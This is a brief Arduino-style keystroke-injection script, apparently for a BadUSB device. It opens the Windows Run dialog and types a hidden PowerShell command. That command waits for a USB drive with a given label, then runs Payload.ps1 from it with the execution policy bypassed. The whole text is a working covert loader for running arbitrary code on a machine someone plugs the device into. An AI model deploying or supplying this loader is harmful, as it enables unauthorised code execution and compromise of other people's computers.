const String USB_LABEL = ""; // Put here the label of your USB, SDCard, etc.
const String SCRIPT_PATH = "\Payload.ps1";

GUI(R);
delay(300);
Escribir("powershell -W H $l='" + USB_LABEL + "'; while (!((Get-WmiObject Win32_LogicalDisk).VolumeName -eq \"$l\")) {}; powershell -Ex Bypass ((Get-WmiObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq \"$l\"} | Select-Object DeviceID).DeviceID + '" + SCRIPT_PATH + "')");
